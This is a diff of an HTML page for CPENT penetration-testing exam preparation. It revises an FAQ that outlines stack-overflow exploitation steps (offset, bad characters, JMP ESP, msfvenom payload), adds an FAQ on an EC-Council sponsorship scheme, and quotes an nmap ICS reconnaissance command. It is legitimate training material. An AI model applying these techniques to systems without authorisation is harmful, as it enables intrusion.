-  <p>You need working competence, not research-grade skill. The binary module expects you to find a stack buffer overflow, calculate the offset, handle bad characters, redirect execution to a <code>JMP ESP</code> and land a msfvenom payload, on both 32 and 64-bit targets. You will not be asked to write a novel heap exploit, but the classic stack overflow workflow must be second nature.</p>
+  <p>Working competence, not research-grade skill. You must find a stack overflow, calculate the offset, handle bad characters, redirect to a <code>JMP ESP</code> (or <code>JMP RSP</code> on 64-bit) and land a msfvenom payload, on both architectures. The classic stack-overflow workflow must be second nature.</p>
+  <h3>What is Hackers 4 Humanity, and how does it relate to CPENT?</h3>
+  <p>An EC-Council initiative offering experienced pen testers a fully sponsored CPENT AI exam. For each pass, EC-Council donates $1,000 of training to underprivileged learners. Score 90%+ and you join the 1,000 Great Pen Testers of 2026. Nominations run from May to early October 2026.</p>
 </section>
 
-<div id="coaching-cta-strip" data-lead="Preparing for CPENT with a job in mind?" data-tail="I mentor pentesters through exactly this ground, 1:1, from first Nmap to the report. Free intake call first." style="min-height:64px;margin:44px 0 0"></div>
+</div><!-- /wrap -->
+
+<div class="wrap">
+<div id="coaching-cta-strip" data-lead="Preparing for CPENT with a job in mind?" data-tail="I mentor pentesters through exactly this ground, 1:1, from first Nmap to the report. Free intake call first." style="min-height:64px;margin:8px 0 0"></div>
 
 <nav class="related" aria-label="Related pages">
   <p class="rl-label">Go deeper</p>
   <ul>
-    <li><a href="/pivoting.html">Pivoting &amp; tunnelling lab</a><span>The exam skill, worked end to end</span></li>
+    <li><a href="/blog/how-to-pass-cpent.html">How to pass CPENT (full guide)</a><span>The drills and 24-hour plan behind these commands</span></li>
+    <li><a href="/pivoting.html">Pivoting &amp; tunnelling lab</a><span>The double pivot, worked end to end</span></li>
     <li><a href="/offsec_medtech.html">Active Directory attack lab</a><span>SQLi to Domain Admin, a full chain</span></li>
-    <li><a href="/osint.html">OSINT guide, 2026 edition</a><span>Recon before you touch a port</span></li>
     <li><a href="/shopeasy.html">API security lab</a><span>IDOR, BOLA and broken auth in practice</span></li>
   </ul>
-  <p class="foot">Preparing for CPENT with a job in mind, not just the badge? <a href="/coaching/">1:1 mentorship</a> &middot; <a href="/start.html">Career roadmap</a> &middot; <a href="https://labs.sarathg.me/">All labs</a></p>
+  <p class="foot">Preparing for CPENT for a job, not just the badge? <a href="/coaching/">1:1 mentorship</a> &middot; <a href="/start.html">Career roadmap</a> &middot; <a href="https://labs.sarathg.me/">All labs</a></p>
 </nav>
+</div>
 
-</div><!-- /wrap -->
 </main>
 
 <script src="cta-coaching.js" defer></script>
@@ -745,13 +910,14 @@ nmap -p 102 --script s7-info 10.10.10.5</pre>
 
 <script>
 function cp(btn){
-  var pre = btn.closest('.code').querySelector('pre');
+  var box = btn.closest('.cmd, .code');
+  var pre = box.querySelector('pre');
   navigator.clipboard.writeText(pre.innerText).then(function(){
     btn.textContent = 'Copied'; btn.classList.add('ok');
     setTimeout(function(){ btn.textContent = 'Copy'; btn.classList.remove('ok'); }, 1800);
   });
 }
-var ids = ["s1","s2","s3","s4","s5","s6","s7","s8","s9","s10","s11","s12","s13","s14"];
+var ids = ["s1","s2","s3","s4","s5","s6","s7","s8","s9","s10","s11","s12","s13","s14","s15"];
 var links = Array.prototype.slice.call(document.querySelectorAll('.toc a'));
 window.addEventListener('scroll', function(){
   var cur = ids[0];
